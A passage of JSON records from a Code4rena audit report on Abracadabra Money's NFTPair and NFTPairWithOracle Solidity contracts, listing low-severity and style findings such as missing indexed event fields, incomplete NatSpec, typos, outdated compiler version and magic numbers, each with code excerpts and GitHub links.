      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n96      uint8 private constant LOAN_INITIAL = 0;\n97      uint8 private constant LOAN_REQUESTED = 1;\n98      uint8 private constant LOAN_OUTSTANDING = 2;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L96-L98>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n113      uint8 private constant LOAN_INITIAL = 0;\n114      uint8 private constant LOAN_REQUESTED = 1;\n115      uint8 private constant LOAN_OUTSTANDING = 2;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L113-L115>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n545      uint8 internal constant ACTION_REPAY = 2;\n546      uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;\n547  \n548      uint8 internal constant ACTION_REQUEST_LOAN = 12;\n549      uint8 internal constant ACTION_LEND = 13;\n550  \n551      // Function on BentoBox\n552      uint8 internal constant ACTION_BENTO_DEPOSIT = 20;\n553      uint8 internal constant ACTION_BENTO_WITHDRAW = 21;\n554      uint8 internal constant ACTION_BENTO_TRANSFER = 22;\n555      uint8 internal constant ACTION_BENTO_TRANSFER_MULTIPLE = 23;\n556      uint8 internal constant ACTION_BENTO_SETAPPROVAL = 24;\n557  \n558      // Any external call (except to BentoBox)\n559      uint8 internal constant ACTION_CALL = 30;\n560  \n561      // Signed requests\n562      uint8 internal constant ACTION_REQUEST_AND_BORROW = 40;\n563      uint8 internal constant ACTION_TAKE_COLLATERAL_AND_LEND = 41;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L545-L563>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #4\n\n578      uint8 internal constant ACTION_REPAY = 2;\n579      uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;\n580  \n581      uint8 internal constant ACTION_REQUEST_LOAN = 12;\n582      uint8 internal constant ACTION_LEND = 13;\n583  \n584      // Function on BentoBox\n585      uint8 internal constant ACTION_BENTO_DEPOSIT = 20;\n586      uint8 internal constant ACTION_BENTO_WITHDRAW = 21;\n587      uint8 internal constant ACTION_BENTO_TRANSFER = 22;\n588      uint8 internal constant ACTION_BENTO_TRANSFER_MULTIPLE = 23;\n589      uint8 internal constant ACTION_BENTO_SETAPPROVAL = 24;\n590  \n591      // Any external call (except to BentoBox)\n592      uint8 internal constant ACTION_CALL = 30;\n593  \n594      // Signed requests\n595      uint8 internal constant ACTION_REQUEST_AND_BORROW = 40;\n596      uint8 internal constant ACTION_TAKE_COLLATERAL_AND_LEND = 41;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L578-L596>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23039",
      "title": "[N-18] Consider making contract `Pausable` to have some protection against ongoing exploits",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n59  contract NFTPair is BoringOwnable, Domain, IMasterContract {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L59>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n69  contract NFTPairWithOracle is BoringOwnable, Domain, IMasterContract {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L69>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23038",
      "title": "[N-17] A best practice is to check for signature malleability",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n383              require(ecrecover(_getDigest(dataHash), v, r, s) == lender, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L383>\n\n```solidity\nFile: contracts/NFTPair.sol   #2\n\n419          require(ecrecover(_getDigest(dataHash), v, r, s) == borrower, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L419>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #3\n\n417              require(ecrecover(_getDigest(dataHash), signature.v, signature.r, signature.s) == lender, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L417>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #4\n\n452          require(ecrecover(_getDigest(dataHash), signature.v, signature.r, signature.s) == borrower, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L452>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23037",
      "title": "[N-16] Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "\nEach `event` should use three `indexed` fields if there are three or more fields\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n65       event LogRequestLoan(address indexed borrower, uint256 indexed tokenId, uint128 valuation, uint64 duration, uint16 annualInterestBPS);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L65>\n\n```solidity\nFile: contracts/NFTPair.sol   #2\n\n66       event LogUpdateLoanParams(uint256 indexed tokenId, uint128 valuation, uint64 duration, uint16 annualInterestBPS);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L66>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n68       event LogRemoveCollateral(uint256 indexed tokenId, address recipient);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L68>\n\n```solidity\nFile: contracts/NFTPair.sol   #4\n\n73       event LogWithdrawFees(address indexed feeTo, uint256 feeShare);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L73>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #5\n\n75       event LogRequestLoan(\n76           address indexed borrower,\n77           uint256 indexed tokenId,\n78           uint128 valuation,\n79           uint64 duration,\n80           uint16 annualInterestBPS,\n81           uint16 ltvBPS\n82       );\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L75-L82>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #6\n\n83       event LogUpdateLoanParams(uint256 indexed tokenId, uint128 valuation, uint64 duration, uint16 annualInterestBPS, uint16 ltvBPS);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L83>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #7\n\n85       event LogRemoveCollateral(uint256 indexed tokenId, address recipient);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L85>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #8\n\n90       event LogWithdrawFees(address indexed feeTo, uint256 feeShare);\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L90>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23036",
      "title": "[N-15] NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n346       /// @notice Caller provides collateral; loan can go to a different address.\n347       /// @param tokenId ID of the token that will function as collateral\n348       /// @param lender Lender, whose BentoBox balance the funds will come from\n349       /// @param recipient Address to receive the loan.\n350       /// @param params Loan parameters requested, and signed by the lender\n351       /// @param skimCollateral True if the collateral has already been transfered\n352       /// @param anyTokenId Set if lender agreed to any token. Must have tokenId 0 in signature.\n353       function requestAndBorrow(\n354           uint256 tokenId,\n355           address lender,\n356           address recipient,\n357           TokenLoanParams memory params,\n358           bool skimCollateral,\n359           bool anyTokenId,\n360           uint256 deadline,\n361           uint8 v,\n362           bytes32 r,\n363           bytes32 s\n```\n\nMissing: `@param deadline`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L346-L363>\n\n```solidity\nFile: contracts/NFTPair.sol   #2\n\n346       /// @notice Caller provides collateral; loan can go to a different address.\n347       /// @param tokenId ID of the token that will function as collateral\n348       /// @param lender Lender, whose BentoBox balance the funds will come from\n349       /// @param recipient Address to receive the loan.\n350       /// @param params Loan parameters requested, and signed by the lender\n351       /// @param skimCollateral True if the collateral has already been transfered\n352       /// @param anyTokenId Set if lender agreed to any token. Must have tokenId 0 in signature.\n353       function requestAndBorrow(\n354           uint256 tokenId,\n355           address lender,\n356           address recipient,\n357           TokenLoanParams memory params,\n358           bool skimCollateral,\n359           bool anyTokenId,\n360           uint256 deadline,\n361           uint8 v,\n362           bytes32 r,\n363           bytes32 s\n```\n\nMissing: `@param v`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L346-L363>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n346       /// @notice Caller provides collateral; loan can go to a different address.\n347       /// @param tokenId ID of the token that will function as collateral\n348       /// @param lender Lender, whose BentoBox balance the funds will come from\n349       /// @param recipient Address to receive the loan.\n350       /// @param params Loan parameters requested, and signed by the lender\n351       /// @param skimCollateral True if the collateral has already been transfered\n352       /// @param anyTokenId Set if lender agreed to any token. Must have tokenId 0 in signature.\n353       function requestAndBorrow(\n354           uint256 tokenId,\n355           address lender,\n356           address recipient,\n357           TokenLoanParams memory params,\n358           bool skimCollateral,\n359           bool anyTokenId,\n360           uint256 deadline,\n361           uint8 v,\n362           bytes32 r,\n363           bytes32 s\n```\n\nMissing: `@param r`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L346-L363>\n\n```solidity\nFile: contracts/NFTPair.sol   #4\n\n346       /// @notice Caller provides collateral; loan can go to a different address.\n347       /// @param tokenId ID of the token that will function as collateral\n348       /// @param lender Lender, whose BentoBox balance the funds will come from\n349       /// @param recipient Address to receive the loan.\n350       /// @param params Loan parameters requested, and signed by the lender\n351       /// @param skimCollateral True if the collateral has already been transfered\n352       /// @param anyTokenId Set if lender agreed to any token. Must have tokenId 0 in signature.\n353       function requestAndBorrow(\n354           uint256 tokenId,\n355           address lender,\n356           address recipient,\n357           TokenLoanParams memory params,\n358           bool skimCollateral,\n359           bool anyTokenId,\n360           uint256 deadline,\n361           uint8 v,\n362           bytes32 r,\n363           bytes32 s\n```\n\nMissing: `@param s`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L346-L363>\n\n```solidity\nFile: contracts/NFTPair.sol   #5\n\n389       /// @notice Take collateral from a pre-commited borrower and lend against it\n390       /// @notice Collateral must come from the borrower, not a third party.\n391       /// @param tokenId ID of the token that will function as collateral\n392       /// @param borrower Address that provides collateral and receives the loan\n393       /// @param params Loan terms offered, and signed by the borrower\n394       /// @param skimFunds True if the funds have been transfered to the contract\n395       function takeCollateralAndLend(\n396           uint256 tokenId,\n397           address borrower,\n398           TokenLoanParams memory params,\n399           bool skimFunds,\n400           uint256 deadline,\n401           uint8 v,\n402           bytes32 r,\n403           bytes32 s\n```\n\nMissing: `@param deadline`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L389-L403>\n\n```solidity\nFile: contracts/NFTPair.sol   #6\n\n389       /// @notice Take collateral from a pre-commited borrower and lend against it\n390       /// @notice Collateral must come from the borrower, not a third party.\n391       /// @param tokenId ID of the token that will function as collateral\n392       /// @param borrower Address that provides collateral and receives the loan\n393       /// @param params Loan terms offered, and signed by the borrower\n394       /// @param skimFunds True if the funds have been transfered to the contract\n395       function takeCollateralAndLend(\n396           uint256 tokenId,\n397           address borrower,\n398           TokenLoanParams memory params,\n399           bool skimFunds,\n400           uint256 deadline,\n401           uint8 v,\n402           bytes32 r,\n403           bytes32 s\n```\n\nMissing: `@param v`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L389-L403>\n\n```solidity\nFile: contracts/NFTPair.sol   #7\n\n389       /// @notice Take collateral from a pre-commited borrower and lend against it\n390       /// @notice Collateral must come from the borrower, not a third party.\n391       /// @param tokenId ID of the token that will function as collateral\n392       /// @param borrower Address that provides collateral and receives the loan\n393       /// @param params Loan terms offered, and signed by the borrower\n394       /// @param skimFunds True if the funds have been transfered to the contract\n395       function takeCollateralAndLend(\n396           uint256 tokenId,\n397           address borrower,\n398           TokenLoanParams memory params,\n399           bool skimFunds,\n400           uint256 deadline,\n401           uint8 v,\n402           bytes32 r,\n403           bytes32 s\n```\n\nMissing: `@param r`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L389-L403>\n\n```solidity\nFile: contracts/NFTPair.sol   #8\n\n389       /// @notice Take collateral from a pre-commited borrower and lend against it\n390       /// @notice Collateral must come from the borrower, not a third party.\n391       /// @param tokenId ID of the token that will function as collateral\n392       /// @param borrower Address that provides collateral and receives the loan\n393       /// @param params Loan terms offered, and signed by the borrower\n394       /// @param skimFunds True if the funds have been transfered to the contract\n395       function takeCollateralAndLend(\n396           uint256 tokenId,\n397           address borrower,\n398           TokenLoanParams memory params,\n399           bool skimFunds,\n400           uint256 deadline,\n401           uint8 v,\n402           bytes32 r,\n403           bytes32 s\n```\n\nMissing: `@param s`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L389-L403>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #9\n\n381       /// @notice Caller provides collateral; loan can go to a different address.\n382       /// @param tokenId ID of the token that will function as collateral\n383       /// @param lender Lender, whose BentoBox balance the funds will come from\n384       /// @param recipient Address to receive the loan.\n385       /// @param params Loan parameters requested, and signed by the lender\n386       /// @param skimCollateral True if the collateral has already been transfered\n387       /// @param anyTokenId Set if lender agreed to any token. Must have tokenId 0 in signature.\n388       function requestAndBorrow(\n389           uint256 tokenId,\n390           address lender,\n391           address recipient,\n392           TokenLoanParams memory params,\n393           bool skimCollateral,\n394           bool anyTokenId,\n395           SignatureParams memory signature\n```\n\nMissing: `@param signature`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L381-L395>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #10\n\n423       /// @notice Take collateral from a pre-commited borrower and lend against it\n424       /// @notice Collateral must come from the borrower, not a third party.\n425       /// @param tokenId ID of the token that will function as collateral\n426       /// @param borrower Address that provides collateral and receives the loan\n427       /// @param params Loan terms offered, and signed by the borrower\n428       /// @param skimFunds True if the funds have been transfered to the contract\n429       function takeCollateralAndLend(\n430           uint256 tokenId,\n431           address borrower,\n432           TokenLoanParams memory params,\n433           bool skimFunds,\n434           SignatureParams memory signature\n```\n\nMissing: `@param signature`\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L423-L434>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23035",
      "title": "[N-14] Typos",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n90       // Track assets we own. Used to allow skimming the excesss.\n```\n\nexcesss\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L90>\n\n```solidity\nFile: contracts/NFTPair.sol   #2\n\n114       // `calculateIntest`.\n```\n\ncalculateIntest\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L114>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n233       /// @param skim True if the token has already been transfered\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L233>\n\n```solidity\nFile: contracts/NFTPair.sol   #4\n\n320       /// @param skim True if the funds have been transfered to the contract\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L320>\n\n```solidity\nFile: contracts/NFTPair.sol   #5\n\n351       /// @param skimCollateral True if the collateral has already been transfered\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L351>\n\n```solidity\nFile: contracts/NFTPair.sol   #6\n\n389       /// @notice Take collateral from a pre-commited borrower and lend against it\n```\n\ncommited\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L389>\n\n```solidity\nFile: contracts/NFTPair.sol   #7\n\n394       /// @param skimFunds True if the funds have been transfered to the contract\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L394>\n\n```solidity\nFile: contracts/NFTPair.sol   #8\n\n434       /// of the above inquality) fits in 128 bits, then the function is\n```\n\ninquality\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L434>\n\n```solidity\nFile: contracts/NFTPair.sol   #9\n\n446           // (NOTE: n is hardcoded as COMPOUND_INTEREST_TERMS)\n```\n\nhardcoded\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L446>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #10\n\n107       // Track assets we own. Used to allow skimming the excesss.\n```\n\nexcesss\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L107>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #11\n\n131       // `calculateIntest`.\n```\n\ncalculateIntest\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L131>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #12\n\n253       /// @param skim True if the token has already been transfered\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L253>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #13\n\n355       /// @param skim True if the funds have been transfered to the contract\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L355>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #14\n\n386       /// @param skimCollateral True if the collateral has already been transfered\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L386>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #15\n\n423       /// @notice Take collateral from a pre-commited borrower and lend against it\n```\n\ncommited\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L423>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #16\n\n428       /// @param skimFunds True if the funds have been transfered to the contract\n```\n\ntransfered\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L428>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #17\n\n467       /// of the above inquality) fits in 128 bits, then the function is\n```\n\ninquality\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L467>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #18\n\n479           // (NOTE: n is hardcoded as COMPOUND_INTEREST_TERMS)\n```\n\nhardcoded\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L479>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23034",
      "title": "[N-13] Fee mechanics should be better described",
      "impact": "LOW",
      "content": "\nWhen reading through the code the first time, it wasn't clear exactly what `openFeeShare` was for and why it's being subtracted from `totalShare`. Add to this the fact that the `protocolFee` is based on the `openFeeShare` and it seems like this area needs more comments, specifically that `openFeeShare` is the fee paid to the lender by the borrower during loan initiation, for the privilege of being given a loan.\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n295          if (skim) {\n296              require(\n297                  bentoBox.balanceOf(asset, address(this)) >= (totalShare - openFeeShare + protocolFeeShare + feesEarnedShare),\n298                  \"NFTPair: skim too much\"\n299              );\n300          } else {\n301              bentoBox.transfer(asset, lender, address(this), totalShare - openFeeShare + protocolFeeShare);\n302          }\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L295-L302>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n330          if (skim) {\n331              require(\n332                  bentoBox.balanceOf(asset, address(this)) >= (totalShare - openFeeShare + protocolFeeShare + feesEarnedShare),\n333                  \"NFTPair: skim too much\"\n334              );\n335          } else {\n336              bentoBox.transfer(asset, lender, address(this), totalShare - openFeeShare + protocolFeeShare);\n337          }\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L330-L337>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23033",
      "title": "[N-12] Constant redefined elsewhere",
      "impact": "LOW",
      "content": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #1\n\n93       IBentoBoxV1 public immutable bentoBox;\n```\n\nseen in contracts/NFTPair.sol\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L93>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n94       NFTPairWithOracle public immutable masterContract;\n```\n\nseen in contracts/NFTPair.sol\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L94>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23032",
      "title": "[N-11] Use a more recent version of solidity",
      "impact": "LOW",
      "content": "\nUse a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`\nUse a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n20   pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L20>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n20   pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L20>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23031",
      "title": "[N-10] Numeric values having to do with time should use time units for readability",
      "impact": "LOW",
      "content": "\nThere are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n111       uint256 private constant YEAR_BPS = 3600 * 24 * 365 * 10_000;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L111>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n128       uint256 private constant YEAR_BPS = 3600 * 24 * 365 * 10_000;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L128>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23030",
      "title": "[N-09] `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n500           if (interest >= 2**128) {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L500>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n533           if (interest >= 2**128) {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L533>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23029",
      "title": "[N-08] `2**<n> - 1` should be re-written as `type(uint<n>).max`",
      "impact": "LOW",
      "content": "\nEarlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas)\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n500           if (interest >= 2**128) {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L500>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n533           if (interest >= 2**128) {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L533>\n\n",
      "summary": "",
